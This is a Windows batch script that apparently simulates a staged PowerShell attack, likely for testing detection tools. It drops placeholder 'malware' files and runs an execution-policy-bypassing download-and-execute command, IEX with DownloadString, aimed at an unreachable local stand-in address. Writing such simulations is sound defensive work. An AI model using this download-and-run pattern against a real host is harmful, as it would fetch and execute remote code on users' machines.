@echo off
REM PowerShell File Creation Attack
set "PS_CMD=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if exist "%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe" set "PS_CMD=%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%PS_CMD%" (
	echo ERROR: PowerShell not found.
	pause
	exit /b 1
)


echo ============================================
echo PowerShell File Creation Attack
echo ============================================
echo.

echo [*] Stage 1: Creating malware executable in temp
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-Item -Path \"$env:TEMP\malware.exe\" -ItemType File -Value 'MALWARE_PAYLOAD' -Force"

echo [*] Stage 2: Creating DLL in ProgramData
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "New-Item -Path \"$env:ProgramData\backdoor.dll\" -ItemType File -Value 'BACKDOOR_PAYLOAD' -Force"

echo [*] Stage 3: Creating script in Public
echo MALICIOUS_SCRIPT > "%PUBLIC%\payload.ps1"
echo MALICIOUS_SCRIPT > "%PUBLIC%\loader.bat"

echo [*] Stage 4: PowerShell with malicious patterns
"%PS_CMD%" -NoProfile -ExecutionPolicy Bypass -Command "try { IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:1/payload') } catch { Write-Host '[SIM] Download failed as expected' }; try { Invoke-WebRequest -Uri 'http://127.0.0.1:1/payload2' -OutFile \"$env:TEMP\payload2.bin\" -ErrorAction Stop } catch { Write-Host '[SIM] IWR failed as expected' }"

echo [*] Stage 5: Cleanup
del "%TEMP%\malware.exe"
del "%ProgramData%\backdoor.dll"

echo.
echo ============================================
echo SIMULATION COMPLETE
echo ============================================
